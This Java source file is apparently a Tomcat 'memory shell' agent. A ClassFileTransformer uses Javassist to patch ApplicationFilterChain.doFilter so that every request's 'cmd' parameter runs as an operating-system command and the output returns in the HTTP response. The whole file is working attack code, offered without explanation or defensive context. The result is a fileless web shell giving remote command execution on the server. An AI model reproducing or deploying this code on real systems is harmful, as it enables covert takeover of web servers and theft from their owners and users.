import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){
            ClassPool pool = ClassPool.getDefault();
            pool.appendClassPath(new LoaderClassPath(loader));
            try {
                CtClass cc = pool.makeClass(new ByteArrayInputStream(classfileBuffer));
                CtMethod doFilter = cc.getDeclaredMethod("doFilter");
                doFilter.insertBefore("{ " +
                        "String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "   try {\n" +
                        "       Process proc = Runtime.getRuntime().exec(cmd);\n" +
                        "       java.io.InputStream in = proc.getInputStream();\n" +
                        "       java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        response.setContentType(\"text/html\");\n" +
                        "       String line;\n" +
                        "       java.io.PrintWriter out = response.getWriter();\n" +
                        "       while ((line = br.readLine()) != null) {\n" +
                        "           out.println(line);\n" +
                        "           out.flush();\n" +
                        "           out.close();\n" +
                        "       }\n" +
                        "   } catch (Exception e) {\n" +
                        "       throw new RuntimeException(e);\n" +
                        "   }\n" +
                        "}" +
                        " }");
                return cc.toBytecode();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        return null;

    }
}